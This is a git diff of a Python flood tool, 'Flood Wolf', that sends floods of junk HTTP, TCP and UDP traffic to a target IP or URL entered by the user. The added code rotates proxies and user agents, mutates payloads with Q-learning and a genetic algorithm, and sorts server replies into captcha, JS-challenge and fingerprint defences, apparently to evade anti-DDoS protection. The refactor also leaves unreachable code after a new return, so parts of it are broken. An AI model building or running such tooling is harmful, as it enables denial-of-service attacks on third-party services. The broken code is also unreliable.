@@ -9,38 +9,19 @@ from rich.live import Live
 from rich.align import Align
 from rich.text import Text
 from urllib.parse import urlparse
-
+from aioquic.asyncio.client import connect
+from aioquic.h3.connection import H3_ALPN
+from aioquic.quic.configuration import QuicConfiguration
 
 console = Console()
 
-console = Console()
-
-BANNER = r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⣇⣠⣶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠏⠃⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣤⣴⣿⣿⡏⢀⣀⣀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠔⠛⠛⢛⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡈⠻⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⢠⡿⠛⢉⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠯⠭⠉⠛⠻⠿⣿⣿⠿⣶⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠟⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡿⢋⣠⣤⠀⠀⠀⠀⠀⠀⠀⠉⠑⠂⠉⠉⠛⠛⠛⠿⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡿⣿⣿⣿⣿⣿⣇⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⣿⣿⠁⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⢿⡏⠀⠸⣿⣿⣿⣿⣿⣿⣿⣇⢠⠀⠀⠀⠀⠀⢿⡿⠿⠿⠟⠫⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠸⡇⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣮⣧⠀⠀⠀⠀⠈⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠃⠀⠀⠀⢻⣿⣿⣿⣿⢿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠸⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠈⠿⣿⠀⠙⣿⣿⣏⠙⠛⢿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠈⠃⠀⠈⠻⣿⡄⠀⠀⠈⠻⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠄⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀	
-			⠀⠀⠀~Fuck Society~⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		          root@ExProGm411~
+BANNER = r"""
+███████╗██╗      ██████╗  ██████╗ ██████╗     ██╗    ██╗ ██████╗ ██╗     ███████╗
+██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗    ██║    ██║██╔═══██╗██║     ██╔════╝
+█████╗  ██║     ██║   ██║██║   ██║██║  ██║    ██║ █╗ ██║██║   ██║██║     █████╗  
+██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║    ██║███╗██║██║   ██║██║     ██╔══╝  
+██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝    ╚███╔███╔╝╚██████╔╝███████╗██║     
+╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝      ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     
 """
 
 user_agents = [
@@ -54,7 +35,7 @@ user_agents = [
 ]
 
 # === Global Stats ===
-status_codes, proxy_fail_count, proto_stats, proxy_success = {}, {}, {}, []
+status_codes, proxy_fail_count, proto_stats, proxy_success, response_clusters = {}, {}, {}, {}, []
 
 @dataclass
 class SessionStats:
@@ -98,6 +79,42 @@ def load_qtable(filename="qtable.json"):
                             data[m][n] = 0.0
             Q_table = data
 
+# === Genetic Evolution ===
+def genetic_evolution(Q_table, ua):
+    # Ambil 2 mode dengan reward tertinggi
+    scores = {m: sum(Q_table[m].values()) for m in Q_table}
+    top_modes = sorted(scores, key=scores.get, reverse=True)[:2]
+    if len(top_modes) < 2:
+        return generate_payload(random.choice(list(Q_table.keys())), ua)
+
+    A, B = top_modes
+    payload_A = generate_payload(A, ua)
+    payload_B = generate_payload(B, ua)
+
+    # Crossover
+    cut = len(payload_A)//2
+    crossover = payload_A[:cut] + payload_B[cut:]
+
+    # Mutation
+    mutation = list(crossover)
+    for i in range(random.randint(1,3)):
+        idx = random.randint(0, len(mutation)-1)
+        mutation[idx] = chr(random.randint(33,126))  # random ASCII
+    new_payload = "".join(mutation)
+
+    return new_payload, len(new_payload), f"genetic_{A}_{B}"
+    
+# === Clustering Respons ===
+def cluster_response(mode, response_text):
+    if "Captcha" in response_text:
+        response_clusters[mode] = "Captcha"
+    elif "challenge" in response_text.lower():
+        response_clusters[mode] = "JS-Challenge"
+    elif "fingerprint" in response_text.lower():
+        response_clusters[mode] = "Fingerprint"
+    else:
+        response_clusters[mode] = "Normal"
+    return response_clusters[mode]
 
 class HackerUI:
     def __init__(self, tool_name="Flood Wolf Brutal", user="ExProGm411"):
@@ -116,11 +133,11 @@ class HackerUI:
 
     def boot(self, config_lines=None):
         os.system("clear")
-        console.print(Panel.fit(Text(BANNER, style="bold yellow"), border_style="bold magenta"))
+        console.print(Panel.fit(Text(BANNER, style="red"), border_style="red"))
         cfg = "\n".join([f"[cyan]•[/cyan] {x}" for x in config_lines]) if config_lines else ""
         console.print(Panel.fit(
             f"[bold]Tool:[/bold] {self.tool_name}\n[bold]User:[/bold] {self.user}\n[bold]Status:[/bold] [green]READY[/green]\n\n{cfg}",
-            title="[bold red]BOOT[/bold red]", border_style="bold magenta"))
+            title="[bold red]BOOT[/bold red]", border_style="red"))
 
     def tick_ok(self, last_text, send_size=0):
         self.stats.events += 1
@@ -150,7 +167,7 @@ class HackerUI:
         t.add_row("Bandwidth", f"{self.stats.bandwidth():,.2f} MB/sec")
         t.add_row("Threads", f"{self.stats.active_threads}")
         t.add_row("Last", self.stats.last)
-        return Panel(Align.left(t), title=f"[bold red]{title}[/bold red]", border_style="bold magenta")
+        return Panel(Align.left(t), title=f"[bold red]{title}[/bold red]", border_style="red")
 
     def update_live(self, live, title="RUNNING"): 
         live.update(self._dashboard(title=title))
@@ -269,9 +286,19 @@ class HackerUI:
         # Exit Panel
         console.print(Panel.fit("[bold green]Exit clean. Respect.[/bold green]", border_style="green"))
 
-        # ✅ Save Q-Table at the end of report
+                # ✅ Save Q-Table at the end of report
         save_qtable()
         console.print("[cyan][+] Q-Table saved to qtable.json[/cyan]")
+
+        # ✅ Response Clustering
+        if response_clusters:
+            cl_table = Table(title="[bold magenta]Response Clustering[/bold magenta]", border_style="magenta")
+            cl_table.add_column("Mode", style="cyan")
+            cl_table.add_column("Cluster", style="yellow")
+            for m, c in response_clusters.items():
+                cl_table.add_row(m, c)
+            console.print(cl_table)
+
 
     # === Helper functions ===
 def load_proxies(filename):
@@ -376,7 +403,7 @@ def update_qtable(state, action, reward, next_state, alpha=0.1, gamma=0.9):
     best_next = max(Q_table[next_state].values())
     Q_table[state][action] += alpha * (reward + gamma * best_next - Q_table[state][action])
 
-# === Adaptive Payload Q ===
+# === Adaptive Payload Q-Learning + GA ===
 def adaptive_payload_q(ua, last_status=None, latency=None, error_type=None, proxy=None):
     global current_mode, last_mode
 
@@ -412,6 +439,15 @@ def adaptive_payload_q(ua, last_status=None, latency=None, error_type=None, prox
     last_mode = current_mode
     current_mode = next_mode
 
+    # Jika reward stagnan → coba genetic evolution
+    if all(v == 0.0 for v in Q_table[current_mode].values()):
+        payload, send_size, mode = genetic_evolution(Q_table, ua)
+        return payload, send_size, mode
+
+    # generate payload sesuai mode
+    payload, send_size, mode = generate_payload(current_mode, ua)
+    return payload, send_size, mode
+
     # dynamic payload size
     size_factor = 1.0
     if latency and latency > 2.0: size_factor = 0.5
@@ -420,29 +456,33 @@ def adaptive_payload_q(ua, last_status=None, latency=None, error_type=None, prox
         if current_mode in ["mutate","mixed"]:
             size_factor *= 0.7
 
-    # generate payload sesuai mode
-    if current_mode == "hex":
-        payload_body = "".join(random.choice("0123456789ABCDEF") for _ in range(int(random.randint(2048,8192)*size_factor)))
-    elif current_mode == "json":
-        payload_body = '{"data":"%s"}' % ("X"*int(random.randint(1024,4096)*size_factor))
-    elif current_mode == "header":
+    # === Payload Generator ===
+def generate_payload(mode, ua):
+    size_factor = 1.0
+    payload_body = ""
+
+    if mode == "hex":
+        payload_body = "".join(random.choice("0123456789ABCDEF") for _ in range(random.randint(2048,8192)))
+    elif mode == "json":
+        payload_body = '{"data":"%s"}' % ("X"*random.randint(1024,4096))
+    elif mode == "header":
         headers = [f"X-Custom-{random.randint(1000,9999)}: {''.join(random.choice('ABCDEF') for _ in range(64))}"
                    for _ in range(random.randint(5,20))]
         payload_body = "\r\n".join(headers)
-    elif current_mode == "mutate":
-        raw = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(int(random.randint(4096,8192)*size_factor)))
+    elif mode == "mutate":
+        raw = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(random.randint(4096,8192)))
         payload_body = base64.b64encode(raw.encode()).decode()
-    elif current_mode == "mixed":
+    elif mode == "mixed":
         headers = [f"X-Mixed-{random.randint(1000,9999)}: {''.join(random.choice('ABCDEF') for _ in range(32))}"
                    for _ in range(random.randint(3,10))]
-        json_part = '{"mix":"%s"}' % ("Y"*int(random.randint(512,2048)*size_factor))
-        hex_part = "".join(random.choice("0123456789ABCDEF") for _ in range(int(random.randint(1024,4096)*size_factor)))
+        json_part = '{"mix":"%s"}' % ("Y"*random.randint(512,2048))
+        hex_part = "".join(random.choice("0123456789ABCDEF") for _ in range(random.randint(1024,4096)))
         payload_body = "\r\n".join(headers)+"\r\n"+json_part+"\r\n"+hex_part
-    else:
-        payload_body = "A"*int(random.randint(2048,8192)*size_factor)
+    else:  # plain
+        payload_body = "A"*random.randint(2048,8192)
 
-    payload = (f"User-Agent: {ua}\r\nX-Mode: {current_mode}\r\n"+payload_body).encode()
-    return payload, len(payload), current_mode
+    payload = (f"User-Agent: {ua}\r\nX-Mode: {mode}\r\n"+payload_body).encode()
+    return payload, len(payload), mode
     
 # === HTTP/1.1 mode + TCP/UDP fallback ===
 def send_packet(ip, port, ui, delay_min, delay_max, proxies=None, target_url=None):
@@ -664,9 +704,9 @@ def attack(ip, port, threads, delay_min, delay_max, ui, proxies=None, target_url
 # === Menu input ===
 def menu():
     os.system("clear")
-    console.print(Panel.fit(Text(BANNER, style="bold yellow"),
+    console.print(Panel.fit(Text(BANNER, style="red"),
                             title="[bold red]Flood Wolf Hybrid[/bold red]",
-                            border_style="bold magenta"))
+                            border_style="red"))
     console.print("[bold cyan]=== Traffic Test Tool Hybrid ===[/bold cyan]\n")
 
     target = console.input("[bold red][+] Masukkan target IP/URL: [/bold red] ").strip()
